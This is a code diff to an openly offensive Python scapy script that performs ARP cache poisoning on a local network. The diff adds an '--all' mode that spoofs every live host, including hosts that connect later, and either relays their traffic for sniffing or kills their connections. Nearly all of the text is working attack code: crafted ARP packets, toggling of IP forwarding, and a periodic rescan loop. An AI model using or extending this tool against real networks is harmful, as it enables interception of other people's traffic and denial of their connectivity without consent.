@@ -66,10 +66,10 @@ class NetCmd:
       else:
         self.endpoints.append( ( rcv.hwsrc, rcv.psrc ) )
       
-    if self.endpoints == []:
+    if self.endpoints == [] and not self.all:
       raise Exception( "Could not find any network alive endpoint." )
 
-  def __init__( self, interface, gateway = None, network = None, kill = False ):
+  def __init__( self, interface, gateway = None, network = None, kill = False, all = False ):
     # scapy, you're pretty cool ... but shut the fuck up bitch!
     conf.verb = 0
 
@@ -77,6 +77,7 @@ class NetCmd:
     self.network    = network
     self.targets    = [] 
     self.gateway    = gateway
+    self.all        = all
     self.gateway_hw = None
     self.packets    = []
     self.restore    = []
@@ -110,23 +111,38 @@ class NetCmd:
     print "@ Please choose your target :"
     choice = None
     
-    while choice is None:
-      for i, item in enumerate( self.endpoints ):
-        print "  [%d] %s %s" % ( i, item[0], item[1] )
-      choice = raw_input( "@ Choose [0-%d] (* to select all, r to refresh): " % (len(self.endpoints) - 1) )
-      try:
-        choice = choice.strip()
-        if choice == '*':
-          self.targets = self.endpoints
-        elif choice.lower() == 'r':
+    if all:
+      self.targets = self.endpoints
+    else:
+      while choice is None:
+        for i, item in enumerate( self.endpoints ):
+          print "  [%d] %s %s" % ( i, item[0], item[1] )
+        choice = raw_input( "@ Choose [0-%d] (* to select all, r to refresh): " % (len(self.endpoints) - 1) )
+        try:
+          choice = choice.strip()
+          if choice == '*':
+            self.targets = self.endpoints
+          elif choice.lower() == 'r':
+            choice = None
+            self.find_alive_hosts()
+          else:
+            self.targets.append( self.endpoints[ int(choice) ] )
+        except Exception as e:
+          print "@ Invalid choice!"
           choice = None
-          self.find_alive_hosts()
-        else:
-          self.targets.append( self.endpoints[ int(choice) ] )
-      except Exception as e:
-        print "@ Invalid choice!"
-        choice = None
+
+    self.craft_packets()
+      
+    if not kill:
+      print "@ Enabling ipv4 forwarding system wide ..."
+      self.__set_forwarding( True )
+    else:
+      print "@ Disabling ipv4 forwarding system wide to kill target connections ..."
+      self.__set_forwarding( False )
     
+    atexit.register( self.restore_cache )
+
+  def craft_packets( self ):
     # craft packets to accomplish a full forwarding:
     #   gateway -> us -> target
     #   target  -> us -> gateway
@@ -136,18 +152,9 @@ class NetCmd:
       # and packets to restore the cache later
       self.restore.append( Ether( src = target[0],       dst = self.gateway_hw ) / ARP( op = "who-has", psrc = target[1],    pdst = self.gateway ) )
       self.restore.append( Ether( src = self.gateway_hw, dst = target[0] )       / ARP( op = "who-has", psrc = self.gateway, pdst = target[1] ) )
-
-    if not kill:
-      print "@ Enabling ipv4 forwarding system wide ..."
-      self.__set_forwarding( True )
-    else:
-      print "@ Disabling ipv4 forwarding system wide to kill target connections ..."
-      self.__set_forwarding( False )
-    
-    atexit.register( self.restore_cache )
     
   def restore_cache( self ):
-    os.write( 1, "@ Restoring ARP cache " )
+    os.write( 1, "\n@ Restoring ARP cache " )
     for i in range(5):
       for packet in self.restore:
         sendp( packet, iface_hint = self.gateway )
@@ -158,6 +165,10 @@ class NetCmd:
     self.__set_forwarding( False )
     
   def spoof( self ):
+    if self.all and self.targets != self.endpoints:
+      self.targets = self.endpoints
+      self.craft_packets()
+
     for packet in self.packets:
       sendp( packet, iface_hint = self.gateway )
 
@@ -173,20 +184,28 @@ try:
   parser.add_option( "-G", "--gateway", action="store",      dest="gateway", default=None,       help="Gateway to use." );
   parser.add_option( "-K", "--kill",    action="store_true", dest="kill",    default=False,      help="Kill targets connections instead of forwarding them." )
   parser.add_option( "-D", "--delay",   action="store",      dest="delay",   default=5,          help="Delay in seconds between one arp packet and another, default is 5." )
+  parser.add_option( "-A", "--all",     action="store_true", dest="all",     default=False,      help="Keep spoofing and spoof all connected and later connected interfaces." )
   
-  (o,args) = parser.parse_args()
+  (o, args) = parser.parse_args()
 
-  ncmd = NetCmd( o.iface, o.gateway, o.network, o.kill )
+  ncmd = NetCmd( o.iface, o.gateway, o.network, o.kill, o.all )
   
   if not o.kill:
     os.write( 1, "@ Spoofing, launch your preferred network sniffer to see target traffic " )
   else:
     os.write( 1, "@ Killing target connections " )
 
+  slept = 0
   while 1:
     ncmd.spoof()
     os.write( 1, '.' )
     time.sleep( o.delay )
+    slept += 1
+
+    if o.all and slept > 10:
+      ncmd.restore_cache()
+      ncmd.find_alive_hosts()
+      slept = 0
 
 except KeyboardInterrupt:
   pass
